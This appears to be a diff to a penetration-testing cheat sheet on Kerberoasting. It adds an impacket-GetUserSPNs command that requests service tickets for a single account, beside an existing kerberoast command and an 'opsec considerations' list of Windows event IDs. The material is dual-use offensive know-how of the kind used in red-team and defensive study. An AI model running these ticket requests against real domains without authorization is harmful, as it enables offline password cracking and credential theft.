@@ -4,6 +4,9 @@ https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUse
 # get user with SPN set and request tickets (kerberoast)
 impacket-GetUserSPNs -request <domain>/<user>:<password> -outputfile <file>
 
+# query single account for available SPNs 
+impacket-GetUserSPNs -request <domain>/<user>:<password> -request-user <user>
+
 # opsec considerations
 # Windows Security Log Event IDs
 -Logon (4624)
